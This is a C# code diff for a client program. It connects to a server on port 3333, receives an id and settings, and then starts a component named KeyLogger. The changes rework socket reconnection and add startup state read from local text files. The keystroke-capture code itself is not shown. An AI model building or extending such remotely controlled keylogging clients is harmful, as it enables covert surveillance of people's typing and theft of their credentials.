@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
@@ -31,9 +32,13 @@ namespace ClientSide
             //Application.EnableVisualStyles();
             //Application.SetCompatibleTextRenderingDefault(false);
             
-            //p.clientForm.ShowDialog();
+            // check if connect at first time or reconnect
             
-            p.connectToServer();
+            if (!p.initialClient())
+            {
+                p.connectToServer();
+            }
+
             Application.Run();
         }
         // The function is activated as soon as data is received in the socket
@@ -42,30 +47,33 @@ namespace ClientSide
 
             try
             {
-
+                clientSocket = AR.AsyncState as Socket;
                 int received = clientSocket.EndReceive(AR);
                 if (received == 0)
                 {
                     return;
                 }
                 string data = Encoding.ASCII.GetString(buffer);
-                var dataFromServer = data.Split(new[] { '\r' }, 2);
+                var dataFromServer = data.Split(new[] { '\r','\n' }, 2);
                
                 if (dataFromServer[0] == "id") {
-                    id = dataFromServer[1];
-                   
+                    id = dataFromServer[1].Split('\0')[0];                   
                 }
-                    
-                if (dataFromServer[0] == "setting") { 
-                    String setting = dataFromServer[1];
+
+                if (dataFromServer[0] == "setting")
+                {
+                    String setting = dataFromServer[1].Split('\0')[0];
                     playMonitor(setting); //This method obtains the settings string from the server
 
                 }
-                System.Threading.Thread.Sleep(7000);
-                SendData("server send: " + data);
-                // Start receiving data again.
+                else {
+                    ShowErrorDialog("Server send:\n" + data);
+                }
+                //System.Threading.Thread.Sleep(7000);
+                //SendData("server send: \n" + data);
+                //Start receiving data again.
                 buffer = new byte[clientSocket.ReceiveBufferSize];
-                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
+                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
             }
             // Avoid Pokemon exception handling in cases like these.
             catch (SocketException ex)
@@ -82,7 +90,7 @@ namespace ClientSide
         private void playMonitor(string setting)
         {
             //set setting 
-            set = new setSetting(setting);
+            set = new setSetting(setting, name, id);
 
             // play key logger
             KeyLogger k = new KeyLogger(dbs, set);
@@ -95,12 +103,13 @@ namespace ClientSide
         {
             try
             {
+                clientSocket = AR.AsyncState as Socket;
                 clientSocket.EndConnect(AR);                
-                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, null);
+                clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
                 
                 if(id != null)
-                    SendData("id\r" +id);
-                else SendData("name\r" + name);
+                    SendData(clientSocket, "id\r" +id);
+                else SendData(clientSocket, "name\r" + name);
             }
             catch (SocketException ex)
             {
@@ -119,6 +128,7 @@ namespace ClientSide
         {
             try
             {
+                clientSocket = AR.AsyncState as Socket;
                 clientSocket.EndSend(AR);
             }
             catch (SocketException ex)
@@ -141,6 +151,7 @@ namespace ClientSide
         {
             try
             {
+                
                 clientForm = new ClientForm();
                 Thread openClientForm = new Thread(openClientFormDialog);
                 openClientForm.SetApartmentState(ApartmentState.STA);
@@ -160,7 +171,7 @@ namespace ClientSide
                 // Connect To Server 
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                 // The function ConnectCallback set callback to receive and send 
-                clientSocket.BeginConnect(endPoint, ConnectCallback, null);
+                clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
             }
             catch (SocketException ex)
             {
@@ -174,36 +185,64 @@ namespace ClientSide
 
         }
 
+        private bool initialClient()
+        {
+            String projectDirectory = Environment.CurrentDirectory;
+            string filepath = Directory.GetParent(projectDirectory).Parent.FullName;
+            String[] paths = new string[] { @filepath, "files" };
+            filepath = Path.Combine(paths);
+
+            DirectoryInfo d = new DirectoryInfo(filepath);//Assuming Test is your Folder
+            if (!Directory.Exists(filepath))
+            {
+                return false;
+            }
+
+            FileInfo[] Files = d.GetFiles("*.txt"); //Getting Text files
+          
+            foreach (FileInfo file   in Files)
+            {
+              
+                if (file.Name != null)
+                {
+                    ShowErrorDialog(file.Name);
+                    // Open the file to read from.
+                    using ( StreamReader sr = File.OpenText(Path.Combine(filepath,file.Name)))
+                    {
+                        name = sr.ReadLine();
+                        id = sr.ReadLine();
+                        ip = "127.1.0.0";
+                    }
+                    reConnect(); 
+                }
+            
+               
+            }
+            if(Files.Length == 0)
+                return false;
+            return true;
+            
+        }
+
         private void openClientFormDialog()
         {
             clientForm.ShowDialog();
         }
 
-        public static string GetLocalIPAddress()
-        {
-            var host = Dns.GetHostEntry(Dns.GetHostName());
-            foreach (var ip in host.AddressList)
-            {
-                if (ip.AddressFamily == AddressFamily.InterNetwork)
-                {
-                    return ip.ToString();
-                }
-            }
-            throw new Exception("No network adapters with an IPv4 address in the system!");
-        }
+        
 
-        public void SendData(String data) {
+        public void SendData(Socket clientSocket, String data) {
             try {
                 ShowErrorDialog("try send: \r\n"+data);
                 var sendData = Encoding.ASCII.GetBytes(data);
-                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, null);
+                clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
 
             }
             catch (SocketException ex)
             {
                 ShowErrorDialog("SendData send SocketException\r\n" + ex.Message);
                 reConnect();
-                SendData("send again " + data);
+                SendData(clientSocket, "send again " + data);
             }
             catch (ObjectDisposedException ex)
             {
@@ -212,6 +251,7 @@ namespace ClientSide
         }
 
         public void reConnect() {
+
             // Create new socket 
             clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             buffer = new byte[clientSocket.ReceiveBufferSize];
@@ -219,7 +259,8 @@ namespace ClientSide
             // Connect To Server 
             IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
             // The function ConnectCallback set callback to receive and send 
-            clientSocket.BeginConnect(endPoint, ConnectCallback, null);
+            clientSocket.BeginConnect(endPoint, ConnectCallback, clientSocket);
         }
+       
     }
 }
